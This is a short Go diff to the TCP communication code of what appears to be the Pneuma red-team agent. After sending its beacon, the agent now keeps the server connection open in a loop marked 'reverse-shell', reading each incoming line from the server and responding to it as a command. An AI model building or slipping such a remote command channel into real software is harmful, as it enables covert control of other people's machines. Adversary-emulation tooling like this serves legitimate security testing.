@@ -1,10 +1,12 @@
 package sockets
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"io"
 	"net"
+	"strings"
 
 	"github.com/preludeorg/pneuma/util"
 )
@@ -22,6 +24,16 @@ func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (uti
 			util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 		} else {
 			bufferedSend(conn, beacon)
+
+			//reverse-shell
+			scanner := bufio.NewScanner(conn)
+			for scanner.Scan() {
+				message := strings.TrimSpace(scanner.Text())
+				respond(conn, beacon, message, agent)
+				if agent.Contact != "tcp" {
+					return beacon, nil
+				}
+			}
 		}
 		jitterSleep(agent.Sleep, "TCP")
 	}
